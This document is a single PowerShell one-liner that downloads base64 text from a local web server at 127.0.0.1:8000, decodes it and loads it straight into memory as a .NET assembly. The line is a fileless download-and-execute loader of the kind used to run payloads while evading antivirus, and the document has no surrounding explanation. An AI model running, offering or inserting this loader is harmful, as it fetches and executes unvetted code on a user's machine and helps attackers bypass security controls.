[System.Reflection.Assembly]::Load([Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('http://127.0.0.1:8000/b64.txt')));
